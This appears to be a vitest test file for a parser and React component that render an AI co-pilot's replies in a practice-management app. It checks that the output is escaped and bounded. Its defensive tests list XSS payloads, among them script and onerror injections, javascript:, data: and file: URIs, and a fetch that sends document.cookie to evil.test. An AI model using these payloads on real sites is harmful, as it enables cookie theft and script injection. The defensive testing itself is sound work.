import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, it, expect } from "vitest";
import { CopilotProse } from "@/components/platform/copilot-prose";
import {
  COPILOT_MARKDOWN_LIMITS,
  parseCopilotInline,
  parseCopilotMarkdown,
  type CopilotBlock,
} from "./markdown";

// ===========================================================================
// THE READER THAT MAKES THE CO-PILOT'S ANSWERS LEGIBLE, AND THE PROOF THAT IT
// CANNOT BE MADE TO EXECUTE ANYTHING.
//
// TWO INSTRUMENTS, ON PURPOSE. Half of this file tests the PARSER (a pure
// function, so its behaviour can be stated exactly) and half renders the real
// component with react-dom/server and asserts on the MARKUP. The second half is
// the one that matters for security: "the parser puts it in a text node" is a
// claim about intent, and "the string &lt;script&gt; appears in the output and
// the string <script> does not" is a claim about what the browser receives.
//
// vitest collects only src/-star-star/*.test.ts in the node environment, so no
// .tsx can BE a test - but a .ts test can import one and render it, which is how
// the component below is exercised.
// ===========================================================================

const render = (text: string) => renderToStaticMarkup(createElement(CopilotProse, { text }));

const kinds = (blocks: CopilotBlock[]) => blocks.map((b) => b.kind);

// ---------------------------------------------------------------------------
// THE SHAPE THE CO-PILOT ACTUALLY WRITES.
//
// Its system prompt (src/lib/copilot/prompt.ts) says: "Lay records and lists out
// clearly with short labelled lines. Do not use markdown symbols like ** or #."
// So the common case is NOT markdown at all, and a reader that only handled
// markdown would improve nothing. These are the cases that carry the feature.
// ---------------------------------------------------------------------------
describe("the co-pilot's own house style, which is not markdown", () => {
  it("keeps a record's labelled lines on separate lines", () => {
    // THE DEFECT THIS PREVENTS: a real markdown reader joins consecutive lines
    // into one flowing paragraph, which turns a four-line patient record into a
    // run-on sentence. The owner reads these to answer the phone.
    const blocks = parseCopilotMarkdown(
      ["Sarah Jones", "Status: Active", "Last visit: 12 June 2026", "Recall: due 12 December 2026"].join("\n"),
    );
    expect(kinds(blocks)).toEqual(["paragraph"]);
    const paragraph = blocks[0];
    if (paragraph.kind !== "paragraph") throw new Error("expected a paragraph");
    expect(paragraph.lines).toHaveLength(4);
    expect(render("Status: Active\nRecall: due").match(/<br\/?>/g)).toHaveLength(1);
  });

  it("starts a new paragraph at a blank line", () => {
    expect(kinds(parseCopilotMarkdown("First thing.\n\nSecond thing."))).toEqual(["paragraph", "paragraph"]);
  });

  it("reads a bulleted run that follows a sentence with no blank line between", () => {
    // The commonest real answer shape: a lead-in line, then the list.
    const blocks = parseCopilotMarkdown("Three patients owe money:\n- Sarah Jones\n- Tom Ali\n- Rita Shah");
    expect(kinds(blocks)).toEqual(["paragraph", "list"]);
    const list = blocks[1];
    if (list.kind !== "list") throw new Error("expected a list");
    expect(list.ordered).toBe(false);
    expect(list.items).toHaveLength(3);
  });

  it("reads a numbered run, and keeps it separate from a bulleted one", () => {
    const blocks = parseCopilotMarkdown("1. Call Sarah\n2. Send the quote\n- and chase the lab");
    expect(kinds(blocks)).toEqual(["list", "list"]);
    const [first, second] = blocks;
    if (first.kind !== "list" || second.kind !== "list") throw new Error("expected two lists");
    expect(first.ordered).toBe(true);
    expect(second.ordered).toBe(false);
    const html = render("1. Call Sarah\n2. Send the quote");
    expect(html).toContain("<ol");
    expect(html).not.toContain("<ul");
  });

  it("does not mistake a year for a numbered item", () => {
    // "2026. That was..." is a sentence the co-pilot writes. Three digits max.
    expect(kinds(parseCopilotMarkdown("2026. That was the busiest month on record."))).toEqual(["paragraph"]);
    expect(kinds(parseCopilotMarkdown("12. Twelve is an item"))).toEqual(["list"]);
  });

  it("renders an empty or whitespace-only reply as nothing at all", () => {
    // Not an empty bordered box, and not a crash: the API can return "" and the
    // turn should simply carry no prose.
    expect(parseCopilotMarkdown("")).toEqual([]);
    expect(render("")).toBe("");
    expect(render("   \n\n  ")).toBe("");
  });
});

// ---------------------------------------------------------------------------
// THE MARKDOWN SUBSET, for the days the model ignores its style instruction -
// which it does, and which is the reason the page showed literal "**" before.
// ---------------------------------------------------------------------------
describe("the markdown subset it does read", () => {
  it("renders bold as <strong> and inline code as <code>", () => {
    const html = render("The total is **£4,180** across `treatment_plans`.");
    expect(html).toContain("<strong");
    expect(html).toContain("£4,180</strong>");
    expect(html).toContain("<code");
    expect(html).toContain("treatment_plans</code>");
    expect(html).not.toContain("**");
  });

  it("leaves an unclosed marker as the characters it is made of", () => {
    // MUTATION GUARD: a reader that treats an opening "**" as bold-to-end-of-line
    // turns the rest of every such answer bold. The literal asterisks are correct.
    expect(render("A total of **£4,180 and rising")).toContain("**£4,180 and rising");
    expect(render("Use the ` key")).toContain("` key");
  });

  it("does not read arithmetic or a stray asterisk as emphasis", () => {
    // The reason there is no single-asterisk italic at all, and the reason bold
    // requires no padding inside its markers.
    const runs = parseCopilotInline("2 ** 3 is 8, and *maybe* is not italic");
    expect(runs.every((run) => run.kind === "text")).toBe(true);
    expect(runs.map((r) => r.text).join("")).toBe("2 ** 3 is 8, and *maybe* is not italic");
  });

  it("reads headings, and does not read a hash that starts a word", () => {
    const blocks = parseCopilotMarkdown("## Today\n#1 priority is the lab");
    expect(kinds(blocks)).toEqual(["heading", "paragraph"]);
    expect(render("## Today")).toContain("<h2");
  });

  it("reads a table only when it carries a divider row", () => {
    // A pipe is ordinary punctuation in an operational answer. Promoting any
    // pipe-bearing lines to a grid would silently reformat prose.
    const real = parseCopilotMarkdown("| Patient | Owed |\n| --- | --- |\n| Sarah Jones | £320 |");
    expect(kinds(real)).toEqual(["table"]);
    const table = real[0];
    if (table.kind !== "table") throw new Error("expected a table");
    expect(table.head).toHaveLength(2);
    expect(table.rows).toHaveLength(1);

    const prose = parseCopilotMarkdown("Open Mon | Wed | Fri\nClosed Tue | Thu");
    expect(kinds(prose)).toEqual(["paragraph"]);

    const html = render("| Patient | Owed |\n| --- | --- |\n| Sarah Jones | £320 |");
    expect(html).toContain("<table");
    expect(html).toContain("overflow-x-auto");
  });
});

// ---------------------------------------------------------------------------
// LINKS: the only place a model-authored string becomes an ATTRIBUTE.
// ---------------------------------------------------------------------------
describe("links, and the schemes that are not links", () => {
  it("links a bare https URL and drops the sentence's full stop", () => {
    const html = render("The preview is at https://azen-vitality.vercel.app/l/abc.");
    expect(html).toContain('href="https://azen-vitality.vercel.app/l/abc"');
    expect(html).toContain('rel="noreferrer noopener"');
    expect(html).not.toContain('href="https://azen-vitality.vercel.app/l/abc."');
  });

  it.each([
    ["javascript:alert(1)", "javascript"],
    ["JavaScript:alert(document.cookie)", "avaScript:"],
    ["data:text/html;base64,PHNjcmlwdD4=", "data:"],
    ["vbscript:msgbox(1)", "vbscript"],
    ["file:///etc/passwd", "file:"],
  ])("never produces an href for %s", (payload) => {
    // THE CENTRAL LINK ASSERTION. The parser reaches a link only through the
    // literal prefixes "http://" and "https://", so no other scheme has a code
    // path to an href. Anything else is text, and text is escaped.
    const runs = parseCopilotInline(`Open ${payload} now`);
    expect(runs.some((run) => run.kind === "link")).toBe(false);
    expect(render(`Open ${payload} now`)).not.toContain("href=");
  });

  it("does not link a URL glued to the end of a word", () => {
    expect(parseCopilotInline("xhttps://evil.test").some((r) => r.kind === "link")).toBe(false);
  });

  it("does not link inside inline code", () => {
    // Code wins the scan, so a URL shown as a literal stays a literal.
    const runs = parseCopilotInline("`https://example.test/x`");
    expect(runs).toHaveLength(1);
    expect(runs[0].kind).toBe("code");
  });
});

// ---------------------------------------------------------------------------
// THE SECURITY PROPERTY.
//
// The co-pilot's reply is a model-authored string with the practice's own
// records interpolated into it, and a patient's name is a field a person can
// type into. So this is not a theoretical payload path: a patient called
// `<img onerror=...>` is a row in someone's PMS somewhere.
// ---------------------------------------------------------------------------
/**
 * The complete set of tags CopilotProse is capable of authoring. Anything else
 * in the markup came from the reply, which is the definition of the bug.
 */
const AUTHORED_TAGS = new Set([
  "div", "p", "br", "strong", "code", "a", "ul", "ol", "li", "h2", "h3", "hr",
  "table", "thead", "tbody", "tr", "th", "td",
]);

const tagsIn = (html: string) =>
  [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map((match) => match[1].toLowerCase());
const hrefsIn = (html: string) => [...html.matchAll(/href="([^"]*)"/g)].map((match) => match[1]);

/**
 * The text a reader would SEE: tags stripped, entities decoded.
 *
 * &amp; is decoded LAST on purpose, so an input that already contained "&lt;"
 * round-trips to "&lt;" rather than collapsing to "<". Without that ordering
 * the double-escaping case below would silently assert the wrong thing.
 */
const textOf = (html: string) =>
  html
    .replace(/<[^>]*>/g, "")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&amp;/g, "&");

describe("hostile input renders as text and nothing else", () => {
  const PAYLOADS = [
    "<script>alert('xss')</script>",
    '<img src=x onerror="alert(1)">',
    "<svg/onload=alert(1)>",
    '<a href="javascript:alert(1)">click</a>',
    "<iframe src='https://evil.test'></iframe>",
    "<style>body{display:none}</style>",
    "</div><script>fetch('https://evil.test?c='+document.cookie)</script>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
  ];

  it.each(PAYLOADS)("renders %s as text, introducing no tag and no href", (payload) => {
    const html = render(`The patient asked about ${payload} today.`);

    // THE ASSERTION THAT MATTERS, and it is deliberately not "the output does
    // not contain the string onerror". It does contain it - as the escaped text
    // &lt;img src=x onerror=...&gt; - and demanding otherwise would only push a
    // future author into STRIPPING the payload, which loses the owner's data to
    // stop an attack that escaping had already stopped. The real property is
    // that the payload produced no ELEMENT and no ATTRIBUTE.
    expect(
      [...new Set(tagsIn(html))].filter((tag) => !AUTHORED_TAGS.has(tag)),
      "the reply introduced a tag the renderer cannot author",
    ).toEqual([]);
    // Any href at all must have come through the scheme allow-list. Note that
    // some payloads DO produce one - "<iframe src='https://evil.test'>" carries
    // a real https URL, and the reader linkifies it exactly as it would in
    // prose. That is not the vulnerability: the destination is visible, it is
    // the anchor's own text, and it needs a deliberate click. The vulnerability
    // would be an href whose scheme executes, and there is no path to one.
    for (const href of hrefsIn(html)) {
      expect(/^https?:\/\//.test(href), `an href escaped the scheme allow-list: ${href}`).toBe(true);
    }

    // And the payload SURVIVED, whole. A sanitiser that deleted it would pass
    // every assertion above and lose a real patient note in the process.
    expect(textOf(html)).toContain(payload);
  });

  it("escapes a payload inside every block kind, not only in a paragraph", () => {
    // A reader is only as safe as its least-used branch. Heading, list item,
    // table cell, bold and inline code all take the same route to the DOM.
    const source = [
      "## <script>alert(1)</script>",
      "- <img src=x onerror=alert(1)>",
      "1. **<script>alert(2)</script>**",
      "| <script>alert(3)</script> | b |",
      "| --- | --- |",
      "| `<script>alert(4)</script>` | d |",
      "https://evil.test/x\"onmouseover=\"alert(5)",
    ].join("\n");
    const html = render(source);
    expect([...new Set(tagsIn(html))].filter((tag) => !AUTHORED_TAGS.has(tag))).toEqual([]);
    // Every block kind really was produced, or this test proves nothing.
    expect(html).toContain("<h2");
    expect(html).toContain("<ul");
    expect(html).toContain("<ol");
    expect(html).toContain("<table");
    expect(html.match(/&lt;script&gt;/g)?.length ?? 0).toBeGreaterThanOrEqual(4);
    // The one href on the page is a link the parser proved the scheme of, and
    // the quote that would have broken out of the attribute is an entity.
    for (const href of hrefsIn(html)) expect(href.startsWith("https://")).toBe(true);
    expect(html).not.toContain('onmouseover="');
  });

  it("never emits dangerouslySetInnerHTML from either half of the reader", async () => {
    // MUTATION GUARD, and the one that matters most: the escaping above is a
    // property of React text children, and the single edit that would void every
    // other test in this file is someone reaching for innerHTML "to support one
    // more tag". Read as source so the ban covers code that no test calls.
    const { readFileSync } = await import("node:fs");
    const { fileURLToPath } = await import("node:url");
    const { dirname, resolve } = await import("node:path");
    const here = dirname(fileURLToPath(import.meta.url));
    for (const file of [
      resolve(here, "markdown.ts"),
      resolve(here, "../../components/platform/copilot-prose.tsx"),
    ]) {
      const source = readFileSync(file, "utf8");
      // The word appears in both files' comments explaining why it is absent,
      // so the ban is on the JSX PROP, which is what would actually be unsafe.
      expect(source, `${file} sets innerHTML on model output`).not.toContain("dangerouslySetInnerHTML={");
      expect(source, `${file} builds an innerHTML string`).not.toContain(".innerHTML");
    }
  });
});

// ---------------------------------------------------------------------------
// BOUNDS. A reply that is not a reply must not lock the owner's browser.
// ---------------------------------------------------------------------------
describe("it is bounded in every dimension", () => {
  it("stops reading past the line, block, item and column ceilings", () => {
    const manyLines = Array.from({ length: COPILOT_MARKDOWN_LIMITS.lines + 500 }, (_, i) => `line ${i}\n`).join("\n");
    const blocks = parseCopilotMarkdown(manyLines);
    expect(blocks.length).toBeLessThanOrEqual(COPILOT_MARKDOWN_LIMITS.blocks);

    const bullets = Array.from({ length: COPILOT_MARKDOWN_LIMITS.listItems + 50 }, (_, i) => `- item ${i}`).join("\n");
    const list = parseCopilotMarkdown(bullets)[0];
    if (list.kind !== "list") throw new Error("expected a list");
    expect(list.items).toHaveLength(COPILOT_MARKDOWN_LIMITS.listItems);

    const wide = `|${Array.from({ length: 40 }, (_, i) => ` c${i} `).join("|")}|`;
    const table = parseCopilotMarkdown(`${wide}\n|${" --- |".repeat(40)}\n${wide}`)[0];
    if (table.kind !== "table") throw new Error("expected a table");
    expect(table.head.length).toBeLessThanOrEqual(COPILOT_MARKDOWN_LIMITS.tableColumns);
  });

  it("returns in linear time on adversarial input", () => {
    // The shapes that make a naive markdown regex backtrack: a long run of
    // openers that never close, and a near-miss URL. If any pattern in the
    // reader could blow up, it blows up here.
    const started = Date.now();
    parseCopilotMarkdown("**".repeat(20_000));
    parseCopilotMarkdown("`".repeat(20_000));
    parseCopilotMarkdown(`https://${"a".repeat(20_000)}`);
    parseCopilotMarkdown(`|${"-".repeat(20_000)}`);
    expect(Date.now() - started).toBeLessThan(2_000);
  });

  it("survives a non-string, which is what a malformed API body yields", () => {
    // postCopilotTurn guards this, but the reader is the last line and a throw
    // here would blank the whole conversation rather than one turn.
    expect(parseCopilotMarkdown(undefined as unknown as string)).toEqual([]);
    expect(parseCopilotMarkdown(null as unknown as string)).toEqual([]);
    expect(parseCopilotMarkdown(42 as unknown as string)).toEqual([]);
  });
});
